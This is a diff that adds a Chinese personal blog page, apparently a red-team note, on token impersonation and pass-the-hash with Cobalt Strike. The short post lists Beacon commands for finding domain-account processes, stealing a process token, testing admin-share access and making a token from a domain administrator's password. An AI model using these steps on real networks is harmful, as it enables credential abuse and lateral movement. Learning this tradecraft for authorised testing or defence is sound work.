@@ -1,0 +1,83 @@
+<!DOCTYPE html>
+<html>
+  <!DOCTYPE html>
+<html lang="en_US">
+<head><meta name="generator" content="Hexo 3.8.0">
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=Edge,chrome=1">
+  
+  <title>Cobaltstrike-Pth(pass the Hash) - x51&#39;BLOG</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0">
+  
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="与其感叹路难行，不如马上出发。">
+  
+  
+  
+
+  <link rel="stylesheet" href="/css/style.css">
+</head>
+</html>
+  <body>
+    <div class="container">
+      <header class="header">
+  <div class="blog-title">
+    <a href="/" class="logo">x51&#39;BLOG</a>
+    <div class="subtitle">与其感叹路难行，不如马上出发.</div>
+  </div>
+  <nav class="navbar">
+    <ul class="menu">
+      
+        <li class="menu-item">
+          <a href="/" class="menu-item-link">Home</a>
+        </li>
+      
+        <li class="menu-item">
+          <a href="/about" class="menu-item-link">About</a>
+        </li>
+      
+    </ul>
+  </nav>
+</header>
+
+<article class="post">
+  <div class="post-title">
+    <h1 class="article-title">Cobaltstrike-Pth(pass the Hash)</h1>
+  </div>
+
+  <!-- 文章目录 -->
+  <ol class="toc"><li class="toc-item toc-level-4"><a class="toc-link" href="#待补充"><span class="toc-text">待补充</span></a></li></ol>
+
+  <div class="post-content">
+    <p>寻找运行在域账号权限下的进程(有可能遇到Domain Admin)<br><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">shell</span><span class="bash"> tasklist /v</span></span><br></pre></td></tr></table></figure></p>
+<p>模拟令牌<br><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">steal_token</span> pid</span><br></pre></td></tr></table></figure></p>
+<p>尝试利用<br><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell dir \\<span class="number">10.0</span><span class="number">.0</span><span class="number">.1</span>\c$</span><br></pre></td></tr></table></figure></p>
+<p>或者在得到域管明文密码的情况下，可以制作令牌来进行传递操作：<br><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">beacon&gt; help make_token</span><br><span class="line">Use: make_token [DOMAIN\user] [password]</span><br><span class="line"></span><br><span class="line">Clone the current access token <span class="keyword">and</span> <span class="builtin-name">set</span> it up <span class="keyword">to</span> pass the specified username</span><br><span class="line"><span class="keyword">and</span> password when you interact with<span class="built_in"> network </span>resources. This command does <span class="keyword">not</span></span><br><span class="line">validate the credentials you provide <span class="keyword">and</span> it has <span class="literal">no</span> effect on local actions.</span><br><span class="line">eg:</span><br><span class="line">make_toke x51.test\administrator password4administrator</span><br></pre></td></tr></table></figure></p>
+<p>cobaltstrike官方博客介绍</p>
+<h4 id="待补充"><a href="#待补充" class="headerlink" title="待补充"></a>待补充</h4>
+  </div>
+  <div class="post-meta">
+    <span class="post-time" style="color:#646060;font-size:13px">2019-05-14</span>
+  </div>
+
+  <div class="post-footer">
+    
+
+    <a href="#top" class="top">Back to Top</a>
+  </div>
+</article>
+
+<!-- 评论插件 -->
+
+<footer>
+  2020
+  <span class="author">
+    x51
+  </span>
+</footer>
+
+
+    </div>
+  </body>
+</html>
